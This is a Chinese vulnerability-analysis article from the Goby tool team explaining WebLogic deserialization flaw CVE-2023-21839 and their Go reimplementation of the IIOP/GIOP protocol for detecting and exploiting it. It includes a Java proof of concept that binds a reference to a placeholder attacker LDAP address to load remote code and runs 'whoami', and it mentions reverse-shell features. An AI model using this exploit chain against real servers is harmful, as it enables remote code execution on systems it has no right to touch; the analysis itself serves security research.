#  跨越语言的艺术：Weblogic序列化漏洞与IIOP协议   
 渊龙Sec安全团队   2023-04-14 13:36  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjLTMIjhRPrloPMpJ4nXfwsIjLDB23mjUrGc3G8Qwo770yYCQAnyVhPGKiaSgfVu0HKnfhT4v5hSWcQ/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJib1s7Nmrx6iamGJwTncn5x80bFrkX9picibUDuUU02Y87KxE77dSDgSdican4C8G8fmx2kUrYs1EYibxA/640?wx_fmt=png "")  
  
  
Goby社区第   
1  
   
篇漏洞分析文章  
  
全文共：  
8042  
   
字    
   
预计阅读时间：  
20  
   
分钟  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
   
**01****概述**  
  
Weblogic 的序列化漏洞主要依赖于 T3 和 IIOP 协议，这两种协议在通信交互的过程中存在如跨语言、网络传输等方面的诸多问题，会给漏洞的检测和利用带来许多不便。在白帽汇安全研究院的理念中，漏洞检测和利用是一项需要创造性的工作，应该以最简洁，高效的方式实现，这样才能确保漏洞的跨平台和实用性。因此，我们通过跨语言方式实现 IIOP 协议通信，以解决出现的序列化漏洞问题。   
  
在 Goby 中的 CVE-2023-21839 漏洞中，我们成功的实现了IIOP 协议跨语言通信的方案，完美实现了漏洞的检测与漏洞利用效果：  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjJib1s7Nmrx6iamGJwTncn5x8iaOibEsBxPBHQuXo7IWWOViccwRlcnNxDkyGH5H1Bd2gfkbYKb6xAjs4A/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
**02****Weblogic IIOP**  
  
GIOP 是⼀种 CORBA 规范定义的协议，⽤于在分布式对象之间进⾏通信和交互，定义了对象请求、响应、异常、命名等基本的通信模式和协议规范。简单来说，GIOP 就是⼀个抽象的协议标准，定义了通信模式和协议规范等信  
息，并不是具体实现的协议。  
  
IIOP 是⼀种实现了 GIOP 协议的 TCP/IP 协议栈，它使得 CORBA 对象能够通过 Internet 进⾏分布式通信和交互。简单  
来说，IIOP 协议是在 TCP/IP 层⾯上实现的 GIOP 协议。  
  
RMI-IIOP 是⼀种 Java 远程⽅法调⽤协议的实现⽅式，它在 IIOP 协议之上扩展了 Java RMI 协议，使得 Java 对象可以通  
过IIOP协议进⾏分布式通信和交互。简单来说，RMI-IIOP 协议就是在 IIOP 协议的基础上集合了 RMI 的远程调⽤ Java 对象的功能。（在本⽂  
中的 Weblogic 部分会将 RMI-IIOP 作为 IIOP 协议来看待）  
  
在⽂章  
《Weblogic IIOP 协议NAT ⽹络绕过》  
(https://www.r4v3zn.com/posts/144eb4b6/#mor  
e)  
   
中提到 “T3 协议本质上 RMI 中传输数据使⽤的协议， RMI-IIOP 是可以兼容 RMI 和 IIOP 的，所以在 Webl  
ogic 中只要可以通过 T3 序列化恶意代码的都可以通过 IIOP 协议进⾏序列化”。对于启⽤了 IIOP 和 T3 协议的 Weblogic ⽽⾔，序列化数据协议传输的过程中是没有本质上区别的，同时在 Weblogic 通信过程中可能会出现NET⽹络问题。因此，为了解决 Java 序列化跨语⾔问题以及 IIOP 的⽹络问题，我选择了 IIOP 协议作为此次 Weblogic 序列化协议研究的重点。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
**03****IIOP攻击流程**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaicXSiaXmXZ8fHXsBqBmGzHylWgIjiaPA1ehibBrBicUHrJ5W4elZGia8exTg/640?wx_fmt=png "")  
  
以 CVE-2023-21839 Weblogic 序列化漏洞为例，在 Weblogic 的 IIOP 攻击流程中，攻击端⾸先初始化上下⽂信息，使⽤  
 rebind()  
 ⽅法向注册端绑定恶意对象，再通过   
lookup()  
 ⽅法触发漏洞远程加载恶意地址中的存根对象。在加载的过程中，⾃定义的恶意对象执⾏⾃绑定的操作，将⼀个具有回显的对象绑定到 Weblogic 注册端上，之后远程调⽤该对象中的⽅法，达到攻击回显的⽬的。  
  
PoC 如下：  
```
public class main {
    public static void main(String[] args) throws NamingException, RemoteException {
        ForeignOpaqueReference foreignOpaqueReference = new ForeignOpaqueReference("ldap://xxx.xxx.xxx.xxx:1389/exp", null);
        String iiop_addr = "iiop://10.211.55.4:7001";
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url", iiop_addr);
        Context context = new InitialContext(env);    // 初始化上下文，建立交互连接 LocateRequest LocateReply
        String bind_name = String.valueOf(System.currentTimeMillis()); 
        context.rebind(bind_name, foreignOpaqueReference);  // 绑定远程对象 rebind_any
        context.lookup(bind_name);  // 获取远程对象 resove_any
ClusterMasterRemote clusterMasterRemote = (ClusterMasterRemote)context.lookup("selfbind_name"); //获取自绑定的回显对象  
        System.out.println(clusterMasterRemote.getServerLocation("whoami"));  // 执行远程对象中的方法  
    }
}
```  
  
**3.1 Java中的攻击流程**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaa8FvMYrVtMrb6icY14ISDreWkhYeJDZxxljqwiaCp2MibHKBTQwvyWRCyw/640?wx_fmt=png "")  
  
1. 在 Weblogic 的 IIOP 序列化交互开始时，客户端初始化上下⽂信息   
new InitialContext()  
 ，通过   
locateNameService()    
⽅法将⽬标地址、序列化对象等信息封装到 IIOP 协议的请求包中作为   
LocateRequest  
 消息与 Weblogic 服务端建⽴通信。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaicnSIB2baJFYVBoE1Ub2uus5Ig1GMhT9z4Pc3c13xticSukUCiabpY5oQ/640?wx_fmt=png "")  
  
2. 当客户端收到服务端的   
LocateReply  
 消息后表示通信交互已建⽴，客户端会解析响应消息体中的信息，并将其中的相关信息（如 Key Address，内部类地址、上下⽂等信息）解析作为下次请求的消息体验证信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaas82clfao2RTUX03CoxIhcOCkice5c4bSzicicLoo3iaIg12mIBgdexgzcg/640?wx_fmt=png "")  
  
3. 通信建⽴后，IIOP 会将建⽴交互时服务端响应包中的   
Key Address  
 作为下次请求中的   
Key Address  
 ，执⾏   
bind()  
 或   
rebind()  
 ⽅法时，绑定对象名称、对象的序列化数据等信息会封装到请求消息体中的   
Stub data  
 字段中作为消息传输。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaagicuaI420DVxgpicMLBSwHDDd3dsaPCkoXqWA2JG0OibsYknIq8t5qGAA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaGdzqQjrcE8iapOkctiavrbw1RLBxhpJ59YBBlWvXicL4ptYPes8PW8lyQ/640?wx_fmt=png "")  
  
4. IIOP 协议执⾏   
lookup()  
 ⽅法时，⾸先通过创建的上下⽂对象调⽤其中的   
lookup()  
 ⽅法，   
lookup()  
 ⽅法根据下⽂中是否为   
NamingContextAny  
 类型来决定调⽤的   
lookup()  
 ⽅法，由于上下⽂对象属于   
NamingContextAny  
 类型，因此通过   
Utils.stringToWNameComponent(var1)   
⽅ 法将字符串 var1 转换成   
WNameComponent（Wide Name Component）  
 数组，并将其传递给   
this.lookup()  
 ⽅法，最后通过调⽤   
resolve_any()  
 ⽅法将消息封装成序列化字节流发送给服务端。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
**04****IIOP 跨语言实现**  
  
  
在《IIOP攻击流程》章节的交互部分中，当 Weblogic 在内网环境下，客户端会将   
LocateReply  
 中返回的 Weblogic 内部类的内网地址作为下次发包的目标地址，因此会出现客户端向自己的内部地址发包，导致网络通信中断问题。同时，由于 Go 语言中并没有官方的 IIOP 协议库可用，我们在 Goby 安全工具上实现漏洞攻击是比较困难的。如果外挂 Java 程序的话会使 Goby 越来越臃肿，这并不符合白帽汇安全研究院的漏洞价值观。针对上面的问题，我们索性直接复刻 IIOP 协议作为最终的通用解决方案。  
  
**4.1 实现思路**  
  
**协议通信的本质是字节流的形式在⽹络中传输数据。因此，Go 实现 IIOP 协议的⽅式就是模拟 IIOP 通信的字节流。**  
  
对于上⽂中的攻击流程，我们将攻击过程中 IIOP 协议通信分为建⽴交互、绑定远程对象、获取远程对象，执⾏对象⽅法四个部分。对应在 Java 主要通过以下⽅法完成：  
```
Context context = new InitialContext(env);    // 初始化上下文，建立交互连接 LocateRequest消息 LocateReply消息
context.rebind(bind_name, foreignOpaqueReference);  // 绑定远程对象 Request消息 rebind_any方法
context.lookup(bind_name);  // 绑定远程对象 Request消息 lookup方法
ClusterMasterRemote clusterMasterRemote = (ClusterMasterRemote)context.lookup("selfbind_name"); //获取自绑定的回显对象   
clusterMasterRemote.getServerLocation("whoami");  // 执行远程对象中的方法
```  
  
我们在 IIOP 协议模拟实现时仅需要实现上述⽅法在执⾏过程中协议交互的字节流即可。  
  
**4.2 GIOP 协议规范**  
  
GIOP（General Inter-ORB Protocol）是⼀种 CORBA 规范定义的协议，⽤于在分布式对象之间进⾏通信和交互，定义了对象请求、响应、异常、命名等基本的通信模式和协议规范。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaapVI28V3fRVPoiayqywEdA1FarpED0zOibepdvYy19e5NvwBIzvcZ867w/640?wx_fmt=png "")  
  
GIOP 消息由消息头和消息体两部分组成。  
  
在 GIOP 消息头中包括了 Magic（GIOP 标识）、Version（GIOP 版本）、Message Flags（标志位）、Message type（消息类型）、Message size（消息体⻓度）四个字段；  
  
在 GIOP 消息体中，主要包含了Request id（请求标识）、TargetAddress（请求⽬标对象键 ID）、Key Address（Key 地址）、Reqest operation（操作⽅法）、SerivceContext（服务上下⽂信息）等字段。  
  
由于篇幅有限，这⾥并不过多叙述 GIOP 字段的含义，如想深⼊研究协议内容，请参考我们总结的⼿册《GIOPProtocol-Analysis》  
(https://github.com/FeatherStark/GIOP-Protocol-Analysis)  
。  
  
**4.2.1 GIOP 协议通信流程**  
  
1. 在通信的初始阶段，⾸先客户端向服务端发送   
LocateRequest  
 类型的消息与服务端建⽴通信，服务端验证请求信息并响应   
LocateReply  
 类型的消息表示收到了客户端的请求信息，开始与客户端进⾏交互通信。  
  
2. 通信建⽴完成后，客户端发送⼀个   
Request  
 类型的消息来执⾏服务端中的⽅法，   
Request  
 消息的请求体中包含了 key 地址（   
Key Address  
 ）、执⾏⽅法名称（   
Request operation  
 ）、消息上下⽂（   
Service Context  
 ）和调⽤远程对象信息（   
Stub data  
 ）等内容。  
  
3. 服务端接收并正常解析请求报⽂后，回应⼀个   
Reply  
 类型的   
No Exceptio  
n  
 消息。如果请求报⽂在服务端中解析出错/异常，则回应⼀个   
Reply  
 类型的   
User Exception  
 /   
System Exception   
消息，同时响应体中会附带异常 ID（   
Exception id  
 ）信息。  
  
**4.3 初始化上下⽂**  
```
Context context = new InitialContext(env); // 初始化上下⽂，建⽴交互连接 LocateRequest消息 LocateReply消息
```  
  
在 Java 代码中，初始化上下⽂信息在创建对象的过程中建⽴ IIOP 协议的交互流程。因此，在 Go 语⾔中实现   
new InitialContext(env)  
 创建对象时⽣成的字节流并发送给 Weblogic 即可。  
new InitialContext(env)  
 对象的创建过程在 IIOP 协议具体实现中为   
LocateRequest  
 消息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaatk95AW5sjeLiaXnhys2gJ6KFV1LibPce82k1XGCIn6b5TfQ8R3JZP8Pg/640?wx_fmt=png "")  
  
客户端发送的   
LocateRequest  
 消息是⼀个固定的格式。其中包含了 GIOP 协议标识，协议版本，消息类型、消息标识等信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaa1M4PMoZxSB2gYT3WjulKB1k58xeSia7xzDwgaxzC37xZDt23bEYMiaOA/640?wx_fmt=png "")  
  
由于   
LocateRequest  
 是⼀个固定格式的序列，所以可以直接将该序列发送给服务端，开始建⽴交互连接。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaq0CeoogG6CUhvaNmT7yhxc8GC7T0rXGVnWrKL1I02NgLejcdicTa0wg/640?wx_fmt=png "")  
  
服务端在收到   
LocateRequest  
 消息并验证正确后，会向客户端响应⼀个   
LocateReply  
 消息。响应的   
LocateReply  
 消息包含了有关服务器的上下⽂信息、key地址、⻓度等信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaarbVjCCpZ663vDkTF3vdNvDs8887CcIBXXC3I4MoV1WCibZ1VRn8DvAQ/640?wx_fmt=png "")  
  
在交互建⽴完成后，下次请求通信过程中会⽤到响应体中的 key 地址，需要将 key 地址解析出来，以便于下次请求包中使⽤。因此，需要先将   
Key Address length  
 的⻓度提取出来，再根据 Key 的⻓度计算出   
Key Address  
 ，并将 key 地址存储起来，以便下次请求使⽤。同时，因为我们下次发包的⽬标地址是⾃主可控的，这就从根源上避免了上⾯出现的 NET ⽹络问题。这样，通信就已经正常建⽴了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaybDH6PQ02Yy31EdGNFfGxUrRtKN9bOqtIa8ElMF03TuOdoTM3wf8tQ/640?wx_fmt=png "")  
  
在通信建⽴之后，为了验证服务端返回的   
Key Address  
 的有效性，我们向服务端发送了⼀个⽅法名为   
_non_existent  
 的   
Request  
 请求消息。如果服务端返回的状态为   
No Exception   
，则说明该   
Key Addresss  
 是有效的。  
  
**4.4 绑****定远程对象**  
```
context.rebind(bind_name, foreignOpaqueReference); // 绑定远程对象 Request消息 rebind_any ⽅法
```  
  
在 Java 语⾔中，使⽤   
rebind()  
 ⽅法可以将⼀个对象绑定到 Weblogic 注册中⼼上。在 Go 语⾔中，我们可以实现   
context.rebind()  
 ⽅法的字节流，将要绑定的名称和序列化对象添加到字节流中，然后发送给 Weblogic。  
  
在 IIOP 协议的具体实现中，   
rebind(  
)  
 ⽅法的操作⽅法名为   
rebind_any  
 。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaficZvZdGukwibSxWKkdHeP05kGMJZgkLqhBF4bIj6DOYQmO2EX9UTDtg/640?wx_fmt=png "")  
  
通过   
rebind_any  
 ⽅法，将   
Stub data  
 中的绑定名称以及序列化对象等数据发送给服务端，服务端执⾏重绑定操作，将对象绑定到  
Weblogic Register  
上。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaLxo9eEeOkLF1nziaQCkGfAOkV6CESBaSrtsrxwKuickYiaOKXNKeYvLOQ/640?wx_fmt=png "")  
  
Go 模拟 r  
ebind_any  
 ⽅法的核⼼将⽣成的 payload 字节流增加到请求体的尾部 Stub data 部分。  
  
**4****.5 获取远程对象**  
```
context.lookup(bind_name); // 绑定远程对象 Request消息 lookup⽅法
```  
  
在 Java 代码中，通过上下⽂对象中的   
lookup()  
 ⽅法可以获取 Weblogic 中绑定名称的存根对象。同样，在 Go 语⾔中，我们可以实现   
context.rebind()  
 ⽅法的字节流，并将要绑定的名称添加到该字节流中，然后将其发送给 Weblogic。  
  
在 IIOP 协议的具体实现中，   
lookup()  
 ⽅法的操作⽅法名为   
resolve_any  
 。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaa5D8YkIdMXbZqVOhDBbsFEytM3O1wToaC1PpQwvDubspSpiaxevG1mQQ/640?wx_fmt=png "")  
  
resolve_any  
 ⽅法通过发送注册命名信息获取注册中⼼上的存根对象。这⾥的 Go 字节码实现和上⾯的相似，都是将信息放到   
Stub data  
 中发送给服务端，只不过这⾥存放的是存根的命名信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaTGCJwBA6VQySJuvmETsupomOcBaO2PZX9MyT4wgn7QKVoibjZTl8tdQ/640?wx_fmt=png "")  
  
resolve_any  
 的响应消息会⽣成⼀个新的   
Key Address  
 ，该key包含获取远程对象的引⽤地址等信息，在执⾏这个对象中的⽅法时，要将新请求消息中的   
Key Address  
 替换成该信息。这样就可以正常执⾏该对象中的⽅法了。  
  
**4.6 执⾏对象⽅法**  
```
clusterMasterRemote.getServerLocation("whoami");  // 执行远程对象中的方法
```  
  
执⾏   
lookup  
 ⽅法后，我们获取到了远程对象的存根信息，这时就可以调⽤对象中的⽅法来实现远程⽅法调⽤的⽬的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaaDtRkm4NQibYdDiblSXGSRJM5x8Bn18LFibb1XbTptD8LdDibbchMGNggw/640?wx_fmt=png "")  
  
例如，我们在 CVE-2023-21839 漏洞上绑定了回显类并有名为   
getServerLocation()  
 的回显⽅法。在 Go 语⾔中，我们只需要按照 GIOP 字节流的格式实现字节流，并将字段   
Request operation  
 的值设置为我们要执⾏的⽅法名，   
Operation length  
 设置为⽅法名的⻓度，   
Stub data  
 中设置为执⾏⽅法的字节流，最后封装成 GIOP 字节流发送给 Weblogic 即可。具体的的漏洞回显效果，正如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjJibMfhVAoEqHjzC4sspvCiaaLFYJR4riaPWYmnib06GUSfm81VZ1345Rkd7CibYqPwy4y2bZlavOIsqtg/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
**05****总结**  
  
在白帽汇安全研究院，漏洞检测和利用是一项创造性的工作，我们致力于以最简洁，高效的方式来实现。为了在 Goby 中实现 Weblogic 序列化漏洞的最佳效果和利用方式，我们花费大量精力阅读 IIOP 序列化源码、分析协议流量、调试协议中的字段和字节码。最终，我们成功在 Go 语言中实现了 IIOP 协议漏洞利用框架。为了验证框架的可靠性，我们以 Weblogic 反序列化漏洞（CVE-2023-21839）为例，在 Goby 上实现了完美的漏洞攻击效果，并加入了一键回显、一键反弹 shell 的利用方式。  
  
**本文中演示的漏洞与功能将于 4 月 18 号（下周二）在Goby上线，届时请关注 Goby 版本更新通知或微信社群公告。**  
  
**Goby社区版免费下载体验：https://gobysec.net/**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
**06****参考**  
  
1. ChatGPT   
(https://chat.openai.com/chat/f6a82469-574f-46d4-bad7-379877a757b7)  
  
2. Java CORBA   
(https://paper.seebug.org/1124/)  
  
3. RMI-IIOP Programmer's Guide   
(https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/rmi_iiop_pg.html)  
  
4. Tutorial: Getting Started Using RMI-IIOP   
(https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html)  
  
5. Configuring WebLogic Server for RMI-IIOP   
(https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/wlrmi/iiop_config.html)  
  
6. Servers: Protocols: IIOP   
(https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/wlach/pagehelp/Corecoreserverserverprotocolsiioptitle.html)  
  
7. Weblogic IIOP 协议NAT ⽹络绕过 | R4v3zn's Blog  
(https://www.r4v3zn.com/posts/144eb4b6/#more)  
  
8. 漫谈 WebLogic CVE-2020-2551 | R4v3zn's Blog  
(  
https://www.r4v3zn.com/posts/b64d9185/#more)  
  
9. Weblogic CVE-2020-2551 绕过NAT⽹络分析 - 先知社区   
(https://xz.aliyun.com/t/11825)  
  
10.【协议森林】详解⼤端(big endian)与⼩端(little endian)_协议森林的博客  
(https://blog.csdn.net/u012503639/article/details/104084052)  
  
11. 基于RapidIO的GIOP协议——RIO-IOP - 中国知⽹  
(https://kns.cnki.net/kcms2/article/abstract?v=3uoqIhG8C44YLTlOAiTRKgchrJ08w1e7fm4X_1ttJAnwAlx1h65p9pncnSo-KzIbXZvSeFDplMDRZRN77n23eO99ylku0fqz&uniplatform=NZKPT)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWfiaAtUngV8rgLh0bIibv9SumD1Y9ZmphGxK9lKiakkOWDp2gRsLjZInPg/640?wx_fmt=png "")  
  
G  
o  
b  
y  
   
欢  
迎  
表  
哥  
/  
表  
姐  
们  
加  
入  
我  
们  
的  
社  
区  
大  
家  
庭  
，  
一  
起  
交  
流  
技  
术  
、  
生  
活  
趣  
事  
、  
奇  
闻  
八  
卦  
，  
结  
交  
无  
数  
白  
帽  
好  
友  
。  
  
也  
欢  
迎  
投  
稿  
到  
   
G  
o  
b  
y  
（  
G  
o  
b  
y  
   
介  
绍  
/  
扫  
描  
/  
口  
令  
爆  
破  
/  
漏  
洞  
利  
用  
/  
插  
件  
开  
发  
/  
   
P  
o  
C  
   
编  
写  
/  
   
I  
P  
   
库  
使  
用  
场  
景  
/  
   
W  
e  
b  
s  
h  
e  
l  
l /漏洞分析   
等  
文  
章  
均  
可  
）  
，  
审  
核  
通  
过  
后  
可  
奖  
励  
   
G  
o  
b  
y  
   
红  
队  
版  
，  
快  
来  
加  
入  
微  
信  
群  
体  
验  
吧  
~  
~  
~  
- 微  
信  
群  
：  
公  
众  
号  
发  
暗  
号  
“  
加  
群  
”  
，  
参  
与  
积  
分  
商  
城  
、  
抽  
奖  
等  
众  
多  
有  
趣  
的  
活  
动  
  
- 获  
取  
版  
本  
：  
h  
t  
t  
p  
s  
:  
/  
/  
g  
o  
b  
y  
s  
e  
c  
.  
n  
e  
t  
/  
s  
a  
l  
e  
  
-   
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjIaeEP9ZkuBRxk7BicMlGFoEZnkVh7ib8GaBYw8lrh8SqACnTUZXlXclC9ZRfOFuvB3gTWHOPvH8icyg/640?wx_fmt=png "")  
  
